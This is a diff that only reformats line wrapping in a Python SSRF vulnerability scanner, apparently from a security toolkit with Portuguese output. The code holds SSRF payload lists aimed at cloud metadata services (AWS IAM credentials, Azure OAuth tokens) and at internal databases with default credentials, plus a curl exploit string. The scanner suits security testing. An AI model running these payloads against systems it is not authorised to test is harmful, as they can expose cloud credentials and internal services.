@@ -96,7 +96,9 @@ _URL_PARAMS_DEFAULT: list[str] = [
 def _load_ssrf_params() -> list[str]:
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "ssrf_detect", default={"url_params": _URL_PARAMS_DEFAULT})
+    data = load_payloads(
+        "web", "ssrf_detect", default={"url_params": _URL_PARAMS_DEFAULT}
+    )
     return data.get("url_params", _URL_PARAMS_DEFAULT)
 
 
@@ -115,7 +117,11 @@ _DETECT_PAYLOADS: list[tuple[str, str, str]] = [
     ("loopback", "http://[::1]", "response"),
     ("metadata_aws", "http://169.254.169.254/latest/meta-data/", "ami-id"),
     ("metadata_gcp", "http://metadata.google.internal/computeMetadata/v1/", "metadata"),
-    ("metadata_azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
+    (
+        "metadata_azure",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "compute",
+    ),
     ("zero_ip", "http://0.0.0.0", "response"),
     ("decimal_ip", "http://2130706433", "response"),
     ("hex_ip", "http://0x7f000001", "response"),
@@ -123,10 +129,18 @@ _DETECT_PAYLOADS: list[tuple[str, str, str]] = [
 
 
 _INTERNAL_PAYLOADS: list[tuple[str, str, list[str]]] = [
-    ("internal_mysql", "mysql://root:password@127.0.0.1:3306/", ["mysql", "access_denied"]),
+    (
+        "internal_mysql",
+        "mysql://root:password@127.0.0.1:3306/",
+        ["mysql", "access_denied"],
+    ),
     ("internal_redis", "redis://127.0.0.1:6379/", ["redis", "connection"]),
     ("internal_mongodb", "mongodb://127.0.0.1:27017/", ["mongodb", "connection"]),
-    ("internal_postgres", "postgresql://user:pass@127.0.0.1:5432/", ["postgresql", "connection"]),
+    (
+        "internal_postgres",
+        "postgresql://user:pass@127.0.0.1:5432/",
+        ["postgresql", "connection"],
+    ),
     ("internal_elasticsearch", "http://127.0.0.1:9200/", ["cluster_name", "elastic"]),
     ("internal_kafka", "http://127.0.0.1:9092/", ["kafka", "connection"]),
     ("internal_etcd", "http://127.0.0.1:2379/", ["etcd", "key"]),
@@ -156,14 +170,46 @@ _BYPASS_PAYLOADS: list[tuple[str, str, str]] = [
 
 
 _CLOUD_PAYLOADS: list[tuple[str, str, list[str]]] = [
-    ("aws_metadata_token", "http://169.254.169.254/latest/api/token", ["ami-id", "instance-id"]),
-    ("aws_metadata_latest", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
-    ("aws_metadata_user_data", "http://169.254.169.254/latest/user-data/", ["user-data"]),
-    ("aws_metadata_iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["credentials"]),
-    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/?recursive=true", ["metadata"]),
-    ("gcp_project", "http://metadata.google.internal/computeMetadata/v1/project/project-id", ["project"]),
-    ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute"]),
-    ("azure_token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", ["access_token"]),
+    (
+        "aws_metadata_token",
+        "http://169.254.169.254/latest/api/token",
+        ["ami-id", "instance-id"],
+    ),
+    (
+        "aws_metadata_latest",
+        "http://169.254.169.254/latest/meta-data/",
+        ["ami-id", "instance-id"],
+    ),
+    (
+        "aws_metadata_user_data",
+        "http://169.254.169.254/latest/user-data/",
+        ["user-data"],
+    ),
+    (
+        "aws_metadata_iam",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        ["credentials"],
+    ),
+    (
+        "gcp_metadata",
+        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+        ["metadata"],
+    ),
+    (
+        "gcp_project",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+        ["project"],
+    ),
+    (
+        "azure_metadata",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        ["compute"],
+    ),
+    (
+        "azure_token",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        ["access_token"],
+    ),
     ("digital_ocean", "http://169.254.169.254/metadata/v1/", ["digitalocean"]),
     ("kubernetes", "https://kubernetes.default.svc/api/v1/namespaces", ["metadata"]),
 ]
@@ -298,7 +344,10 @@ async def _test_detect(
 
     for param in _URL_PARAMS[:8]:
         for name, payload, _ in _DETECT_PAYLOADS[:6]:
-            new_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+            new_params = {
+                k: v[0] if isinstance(v, list) else v
+                for k, v in original_params.items()
+            }
 
             new_params[param] = payload
 
@@ -343,9 +392,12 @@ async def _test_detect(
                         size_changed=size_changed,
                         time_changed=time_changed,
                         vulnerable=vuln,
-                        details=f"Param {param}: {name}" + (" -> changed" if vuln else ""),
+                        details=f"Param {param}: {name}"
+                        + (" -> changed" if vuln else ""),
                         error="",
-                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/" if vuln else "",
+                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
+                        if vuln
+                        else "",
                         tool="curl",
                     )
                 )
@@ -394,7 +446,10 @@ async def _test_internal(
 
     for param in _URL_PARAMS[:5]:
         for name, payload, indicators in _INTERNAL_PAYLOADS[:5]:
-            new_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+            new_params = {
+                k: v[0] if isinstance(v, list) else v
+                for k, v in original_params.items()
+            }
 
             new_params[param] = payload
 
@@ -417,7 +472,11 @@ async def _test_internal(
 
                 detected = _check_ssrf_response(resp.content, status_test, indicators)
 
-                vuln = detected or status_test != status_base or size_changed(size_test, size_base)
+                vuln = (
+                    detected
+                    or status_test != status_base
+                    or size_changed(size_test, size_base)
+                )
 
                 attempts.append(
                     SSRFAttempt(
@@ -435,9 +494,12 @@ async def _test_internal(
                         size_changed=size_changed(size_test, size_base),
                         time_changed=elapsed > time_base * 2 and elapsed > 1.0,
                         vulnerable=vuln,
-                        details=f"Param {param}: {name}" + (" -> FOUND" if detected else ""),
+                        details=f"Param {param}: {name}"
+                        + (" -> FOUND" if detected else ""),
                         error="",
-                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/" if vuln else "",
+                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
+                        if vuln
+                        else "",
                         tool="curl",
                     )
                 )
@@ -492,7 +554,10 @@ async def _test_bypass(
 
     for param in _URL_PARAMS[:5]:
         for name, payload, _ in _BYPASS_PAYLOADS:
-            new_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+            new_params = {
+                k: v[0] if isinstance(v, list) else v
+                for k, v in original_params.items()
+            }
 
             new_params[param] = payload
 
@@ -537,9 +602,12 @@ async def _test_bypass(
                         size_changed=size_changed_flag,
                         time_changed=time_changed_flag,
                         vulnerable=vuln,
-                        details=f"Bypass {param}: {name}" + (" -> changed" if vuln else ""),
+                        details=f"Bypass {param}: {name}"
+                        + (" -> changed" if vuln else ""),
                         error="",
-                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/" if vuln else "",
+                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
+                        if vuln
+                        else "",
                         tool="curl",
                     )
                 )
@@ -588,7 +656,10 @@ async def _test_cloud(
 
     for param in _URL_PARAMS[:5]:
         for name, payload, indicators in _CLOUD_PAYLOADS[:4]:
-            new_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+            new_params = {
+                k: v[0] if isinstance(v, list) else v
+                for k, v in original_params.items()
+            }
 
             new_params[param] = payload
 
@@ -611,7 +682,11 @@ async def _test_cloud(
 
                 detected = _check_ssrf_response(resp.content, status_test, indicators)
 
-                vuln = detected or status_test != status_base or size_changed(size_test, size_base)
+                vuln = (
+                    detected
+                    or status_test != status_base
+                    or size_changed(size_test, size_base)
+                )
 
                 attempts.append(
                     SSRFAttempt(
@@ -629,9 +704,12 @@ async def _test_cloud(
                         size_changed=size_changed(size_test, size_base),
                         time_changed=elapsed > time_base * 2 and elapsed > 1.0,
                         vulnerable=vuln,
-                        details=f"Cloud {param}: {name}" + (f" -> FOUND={indicators[0]}" if detected else ""),
+                        details=f"Cloud {param}: {name}"
+                        + (f" -> FOUND={indicators[0]}" if detected else ""),
                         error="",
-                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/" if vuln else "",
+                        exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
+                        if vuln
+                        else "",
                         tool="curl",
                     )
                 )
@@ -694,7 +772,11 @@ async def _test_header(
 
             detected = _check_ssrf_response(resp.content, status_test, indicators)
 
-            vuln = detected or status_test != status_base or size_changed(size_test, size_base)
+            vuln = (
+                detected
+                or status_test != status_base
+                or size_changed(size_test, size_base)
+            )
 
             attempts.append(
                 SSRFAttempt(
@@ -712,9 +794,12 @@ async def _test_header(
                     size_changed=size_changed(size_test, size_base),
                     time_changed=elapsed > time_base * 2 and elapsed > 1.0,
                     vulnerable=vuln,
-                    details=f"Header {header}: {name}" + (" -> FOUND" if detected else ""),
+                    details=f"Header {header}: {name}"
+                    + (" -> FOUND" if detected else ""),
                     error="",
-                    exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/" if vuln else "",
+                    exploit="curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/"
+                    if vuln
+                    else "",
                     tool="curl",
                 )
             )
@@ -749,7 +834,11 @@ async def _test_header(
 def print_results(result: SSRFResult) -> None:
     """Exibe resultados formatados."""
 
-    tls_tag = color("[HTTPS]", Cyber.GREEN, Cyber.BOLD) if result.tls else color("[HTTP]", Cyber.YELLOW)
+    tls_tag = (
+        color("[HTTPS]", Cyber.GREEN, Cyber.BOLD)
+        if result.tls
+        else color("[HTTP]", Cyber.YELLOW)
+    )
 
     print(color("\n" + "=" * 60, Cyber.GRAY))
 
@@ -761,14 +850,23 @@ def print_results(result: SSRFResult) -> None:
 
     print(color(f"  TLS:        {tls_tag}", Cyber.WHITE))
 
-    print(color(f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
+    print(
+        color(
+            f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)",
+            Cyber.GRAY,
+        )
+    )
 
     print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))
 
     vuln_techs = result.vulnerable_techniques
 
     if vuln_techs:
-        print(color(f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD))
+        print(
+            color(
+                f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD
+            )
+        )
 
         for tech in vuln_techs[:10]:
             print(color(f"      [!] {tech}", Cyber.RED))
@@ -862,9 +960,15 @@ async def run_scan(
 
         vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
 
-        blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
+        blocked = [
+            a.technique for a in all_attempts if not a.vulnerable and not a.error
+        ]
 
-        issues: list[str] = [f"VULN: {att.technique} - {att.details}" for att in all_attempts if att.vulnerable]
+        issues: list[str] = [
+            f"VULN: {att.technique} - {att.details}"
+            for att in all_attempts
+            if att.vulnerable
+        ]
 
         overall = "vulnerable" if vuln_techs else "secure"
 
@@ -888,7 +992,11 @@ async def run_scan(
         if output_file:
             write_output(output_file, asdict(result))
 
-        logger.info("SSRF scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
+        logger.info(
+            "SSRF scan concluido: %d testes, %d vulneraveis",
+            len(all_attempts),
+            len(vuln_techs),
+        )
 
         return 1 if vuln_techs else 0
 
@@ -935,7 +1043,12 @@ def build_parser() -> argparse.ArgumentParser:
         help="Categoria de testes (default: todas)",
     )
 
-    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
+    parser.add_argument(
+        "--concurrency",
+        type=int,
+        default=5,
+        help="Requisicoes simultaneas (default: 5)",
+    )
 
     add_common_args(parser)
 
@@ -972,7 +1085,9 @@ def main() -> int:
         parser=build_parser(),
         banner_fn=banner_art,
         run_fn=run_once,
-        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
+        has_target=lambda a: bool(
+            getattr(a, "url", None) or getattr(a, "target", None)
+        ),
         prompt="ssrf> ",
         description="SSRF interativo.",
         example="https://target.com -c detect",
